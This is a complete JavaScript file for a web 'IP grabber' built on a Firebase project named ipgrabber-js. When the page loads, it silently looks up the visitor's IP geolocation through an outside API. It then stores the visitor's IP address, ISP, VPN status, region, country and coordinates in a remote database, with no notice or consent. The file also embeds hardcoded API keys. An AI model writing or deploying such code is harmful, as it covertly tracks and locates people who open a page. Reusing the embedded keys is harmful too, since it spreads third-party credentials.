let firebaseConfig = {
  apiKey: "AIzaSyAT_dnlElgEJh2fR8UTjsgCZpUboLHLRy4",
  authDomain: "ipgrabber-js.firebaseapp.com",
  databaseURL: "https://ipgrabber-js-default-rtdb.firebaseio.com",
  projectId: "ipgrabber-js",
  storageBucket: "ipgrabber-js.appspot.com",
  messagingSenderId: "196446132758",
  appId: "1:196446132758:web:3081d578667b2fe3507337",
  measurementId: "G-HP68TYKM1Y"
};

firebase.initializeApp(firebaseConfig);

let database = firebase.database()

let code = Math.floor(1000 + Math.random() * 9000);

$.getJSON('https://ipgeolocation.abstractapi.com/v1/?api_key=05c9a9a156ea4677ba93f8ebf22dc138', function(data) {
  let body = data
  database.ref(`User-${code}`).set({
    VPN: body.security.is_vpn,
    IP: body.ip_address,
    Region: body.region,
    Country: body.country,
    ISP: body.connection.isp_name,
    Longitude: body.longitude,
    Latitude: body.latitude
  })
});
